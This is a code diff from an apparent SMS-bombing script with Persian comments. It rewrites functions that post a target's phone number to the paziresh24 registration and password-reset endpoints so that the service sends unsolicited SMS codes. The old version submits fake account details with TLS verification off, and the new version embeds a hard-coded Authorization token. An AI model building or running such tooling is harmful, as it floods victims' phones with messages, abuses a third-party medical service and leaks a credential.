@@ -64,57 +64,45 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-def paziresh24(phone):
+def paziresh24_register(phone):
+    url = "https://apigw.paziresh24.com/gozargah/register"
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "accept-timezone": "Asia/Tehran",
+        "Content-Type": "application/json; charset=utf-8",
+        "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f"
+    }
+    json_data = {
+        "username": phone
+    }
     try:
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "accept-timezone": "Asia/Tehran", 
-            "content-type": "application/json; charset=utf-8",
-            "User-Agent": random.choice(user_agents),
-        }
-        
-        # payload کامل‌تر با فیلدهای مورد نیاز
-        payload = {
-            "mobile": formatted_phone,
-            "name": "کاربر",
-            "last_name": "تست", 
-            "gender": "male",
-            "national_code": "",
-            "email": "",
-            "birth_date": "1370-01-01",
-            "password": "Test1234",
-            "password_confirmation": "Test1234"
-        }
-        
-        response = requests.post(
-            "https://apigw.paziresh24.com/gozargah/register",
-            json=payload,
-            headers=headers, 
-            timeout=10,
-            verify=False
-        )
-        
-        print(f'{y}[Debug] paziresh24 Status: {response.status_code}{a}')
-        print(f'{y}[Debug] paziresh24 Response: {response.text}{a}')
-        
+        response = requests.post(url, headers=headers, json=json_data, timeout=10)
         if response.status_code == 200:
-            data = response.json()
-            if data.get("status") == 1:
-                print(f'{g}(paziresh24) sms sent successfully!{a}')
-                return True
-            else:
-                print(f'{r}[-] paziresh24 failed: {data.get("message", "Unknown error")}{a}')
-                return False
+            print(f"[+] paziresh24_register → Success for {phone}")
         else:
-            print(f'{r}[-] paziresh24 http error: {response.status_code}{a}')
-            return False
-            
+            print(f"[-] paziresh24_register → Failed ({response.status_code}) for {phone}")
     except Exception as e:
-        print(f'{r}[!] paziresh24 exception: {e}{a}')
-        return False
+        print(f"[!] paziresh24_register → Error: {e}")
+
+
+def paziresh24_reset(phone):
+    url = "https://apigw.paziresh24.com/gozargah/resetpassword"
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "accept-timezone": "Asia/Tehran",
+        "Content-Type": "application/json; charset=utf-8"
+    }
+    json_data = {
+        "username": phone
+    }
+    try:
+        response = requests.post(url, headers=headers, json=json_data, timeout=10)
+        if response.status_code == 200:
+            print(f"[+] paziresh24_reset → Success for {phone}")
+        else:
+            print(f"[-] paziresh24_reset → Failed ({response.status_code}) for {phone}")
+    except Exception as e:
+        print(f"[!] paziresh24_reset → Error: {e}")
 
 
         
